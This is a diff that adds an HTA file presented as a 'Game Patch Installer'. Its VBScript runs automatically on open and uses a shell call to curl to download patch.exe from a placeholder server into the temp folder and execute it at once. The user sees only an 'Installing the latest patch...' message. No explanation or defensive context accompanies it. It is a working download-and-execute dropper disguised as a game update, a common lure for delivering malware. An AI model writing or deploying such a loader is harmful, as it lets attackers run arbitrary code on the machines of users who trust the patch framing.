@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Game Patch Installer</title>
+    <HTA:APPLICATION 
+        ID="PatchInstaller"
+        APPLICATIONNAME="Game Patch Installer"
+        BORDER="thin"
+        CAPTION="yes"
+        SCROLL="no"
+        SINGLEINSTANCE="yes"
+        SYSMENU="yes"
+    >
+</head>
+<body>
+<h1>Game Patch Installer</h1>
+<p>Installing the latest patch...</p>
+<script type="text/vbscript">
+    Sub DownloadAndExecuteWithCurl()
+        Dim curlCommand, shell, tempPath
+
+        ' Define the URL and local file path
+        patchUrl = "http://<your-server-ip>:8080/patch.exe" ' Replace with actual server IP or hostname
+        Set shell = CreateObject("WScript.Shell")
+        tempPath = shell.ExpandEnvironmentStrings("%TEMP%\patch.exe")
+
+        ' Create the curl command
+        curlCommand = "cmd /c curl -o " & Chr(34) & tempPath & Chr(34) & " " & Chr(34) & patchUrl & Chr(34) & " && " & tempPath
+
+        ' Execute the curl command to download and run the patch
+        shell.Run curlCommand, 1, True
+    End Sub
+
+    ' Trigger the patch download and execution
+    DownloadAndExecuteWithCurl()
+</script>
+</body>
+</html>
